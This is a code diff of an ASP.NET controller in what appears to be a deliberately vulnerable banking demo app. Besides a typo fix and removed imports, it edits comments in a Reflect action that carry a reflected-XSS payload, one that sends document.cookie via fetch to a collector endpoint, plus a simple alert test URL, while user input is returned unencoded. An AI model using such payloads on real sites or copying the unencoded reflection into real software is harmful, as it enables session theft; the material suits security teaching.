@@ -1,12 +1,10 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
-using System.Net;
 using System.Threading.Tasks;
 using ElmahCore;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.Extensions.Logging;
-using Newtonsoft.Json;
 using TerribleBankInc.Models.ViewModels;
 
 namespace TerribleBankInc.Controllers;
@@ -32,7 +30,7 @@ public class HomeController : BaseController
 
     public IActionResult Boom()
     {
-        HttpContext.RiseError(new NotImplementedException("Forgot something?"));
+        HttpContext.RaiseError(new NotImplementedException("Forgot something?"));
         return null;
     }
 
@@ -46,12 +44,14 @@ public class HomeController : BaseController
 
     public IActionResult Reflect(string search = null)
     {
-        //<script>const request = new Request('https://localhost:44367/api/Gimme?stringData='+"{'ID':0,'DataType':'Cookie','Data':'"+document.cookie+"'}", {method: 'GET'});fetch(request);</script>
-        //https://localhost:5001/Home/Reflect?search=%3Cscript%3Econst+request+%3D+new+Request%28%27https%3A%2F%2Flocalhost%3A44367%2Fapi%2FGimme%3FstringData%3D%27%2B%22%7B%27ID%27%3A0%2C%27DataType%27%3A%27Cookie%27%2C%27Data%27%3A%27%22%2Bdocument.cookie%2B%22%27%7D%22%2C+%7Bmethod%3A+%27GET%27%7D%29%3Bfetch%28request%29%3B%3C%2Fscript%3E
+        //<script>const request = new Request('https://localhost:5003/api/Gimme?stringData='+"{'ID':0,'DataType':'Cookie','Data':'"+document.cookie+"'}", {method: 'GET'});fetch(request);</script>
+        //https://localhost:5001/Home/Reflect?search=%3Cscript%3Econst+request+%3D+new+Request%28%27https%3A%2F%2Flocalhost%3A5003%2Fapi%2FGimme%3FstringData%3D%27%2B%22%7B%27ID%27%3A0%2C%27DataType%27%3A%27Cookie%27%2C%27Data%27%3A%27%22%2Bdocument.cookie%2B%22%27%7D%22%2C+%7Bmethod%3A+%27GET%27%7D%29%3Bfetch%28request%29%3B%3C%2Fscript%3E
         //WebUtility.HtmlEncode(search)
         // https://www.chromium.org/developers/design-documents/xss-auditor
 
         //Response.Headers.Add("X-XSS-Protection", "1; mode=block; report=\"https://localhost:5001/Home/Report\"");
+        
+        // https://localhost:5001/Home/Reflect?search=%3Cscript%3Ealert%28%22henlo+h00man%22%29%3B%3C%2Fscript%3E
 
         return View(nameof(Reflect), search);
     }
